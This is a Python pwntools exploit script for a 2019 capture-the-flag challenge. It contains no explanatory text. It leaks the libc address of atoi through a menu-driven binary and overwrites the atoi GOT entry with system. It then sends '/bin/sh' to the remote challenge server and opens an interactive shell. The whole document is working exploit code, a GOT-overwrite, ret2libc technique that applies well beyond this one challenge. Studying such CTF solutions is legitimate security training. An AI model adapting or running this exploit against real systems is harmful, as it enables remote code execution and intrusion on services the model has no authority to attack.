from pwn import *

libc = ELF('./libc-2.23.so')
atoi_plt = 0x0804b03c
spm = 0x0804b050
libc_atoi = libc.symbols['atoi']
libc_system = libc.symbols['system']

def greet(size):
	p.recvuntil('Command me:')
	p.sendline('1')
	p.recvuntil('How much greet? : ')
	p.sendline(str(size))

def writ(size):
	p.recvuntil('Command me:')
	p.sendline('2')
	p.recvuntil('How much writ? : ')
	p.sendline(str(size))
	return p.recv(4)

def yeet():
	p.recvuntil('Command me:')
	p.sendline('3')

def	eat(data):
	p.recvuntil('Command me:')
	p.sendline('4')
	p.recvuntil('Pizza: ')
	p.sendline(data)

def delet():
	p.recvuntil('Command me:')
	p.sendline('5')

p = remote('chall.2019.redpwn.net', 4006)

greet(20)
eat(p32(atoi_plt) + p32(spm))
yeet()
leak = u32(writ(4))
libc_base = leak - libc_atoi
system_addr = libc_base + libc_system

greet(20)
eat(p32(system_addr) + p32(atoi_plt))
yeet()
greet('/bin/sh')
p.interactive()
